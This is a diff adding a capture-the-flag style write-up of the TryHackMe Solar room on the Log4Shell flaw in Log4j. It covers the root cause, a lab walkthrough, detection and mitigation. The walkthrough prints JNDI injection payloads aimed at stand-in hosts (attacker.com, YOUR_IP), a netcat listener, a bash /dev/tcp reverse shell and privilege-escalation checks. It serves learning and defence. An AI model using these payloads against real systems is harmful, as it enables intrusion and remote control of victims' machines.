@@ -1,0 +1,105 @@
+🌞 Solar (Log4J) – Full Writeup!
+
+🔹 Overview
+This room focuses on the Log4Shell vulnerability in Log4j, a widely used Java logging library.
+Vulnerability: Log4Shell
+CVE: CVE-2021-44228
+Impact: Remote Code Execution (RCE)
+
+🔹 What is Log4j?
+A Java logging library used in many applications.
+Developers use it to log messages (errors, user input, etc.)
+Example:
+logger.info("User input: " + username);
+
+🔹 Root Cause of Vulnerability
+Log4j supports JNDI lookups (Java Naming and Directory Interface).
+Attackers can inject:
+${jndi:ldap://attacker.com/exploit}
+👉 Log4j will:
+Contact attacker server
+Download malicious class
+Execute it
+➡️ Result: Remote Code Execution
+
+🔹 Attack Flow (Important for Exams)
+Attacker sends malicious input
+Application logs the input
+Log4j processes ${jndi:...}
+Makes request to attacker-controlled LDAP server
+Loads malicious payload
+Code executes on victim machine
+
+🔹 Lab Walkthrough
+
+🧪 Step 1: Initial Access
+Open the web application provided in TryHackMe
+Identify input fields (login, headers, etc.)
+
+🧪 Step 2: Test for Vulnerability
+Inject payload:
+${jndi:ldap://YOUR_IP:1389/a}
+📌 Common injection points:
+Username field
+HTTP headers (User-Agent)
+URL parameters
+
+🧪 Step 3: Set Up Listener (Attacker Machine)
+Use tools like:
+nc (netcat)
+or custom LDAP server
+Example:
+nc -lvnp 4444
+
+🧪 Step 4: Exploitation
+Payload example:
+${jndi:ldap://YOUR_IP:1389/Exploit}
+If successful:
+Target connects back to attacker
+Reverse shell obtained
+
+🧪 Step 5: Get Reverse Shell
+Example payload:
+bash -i >& /dev/tcp/YOUR_IP/4444 0>&1
+➡️ You now have shell access
+
+🧪 Step 6: Stabilize Shell (Optional)
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+🧪 Step 7: Privilege Escalation
+Typical steps:
+Check sudo:
+sudo -l
+Find SUID binaries:
+find / -perm -4000 2>/dev/null
+Look for misconfigurations
+
+🔹 Key Indicators of Vulnerability
+Application logs user input directly
+Uses vulnerable Log4j versions:
+2.0 – 2.14.1
+
+🔹 Detection Techniques
+1. Log Monitoring
+Look for:
+${jndi:ldap://
+2. Network Monitoring
+Outbound LDAP/DNS requests to unknown servers
+
+🔹 Mitigation / Fix
+✅ Immediate Fixes:
+Upgrade Log4j to:
+2.17.0 or later
+✅ Temporary Fix:
+Remove JNDI lookup:
+log4j2.formatMsgNoLookups=true
+✅ Network Controls:
+Block outbound LDAP traffic
+
+🔹 Real-World Impact
+Affected:
+Minecraft
+Apache servers
+Cloud apps
+Severity:
+🔥 Critical (CVSS 10.0)
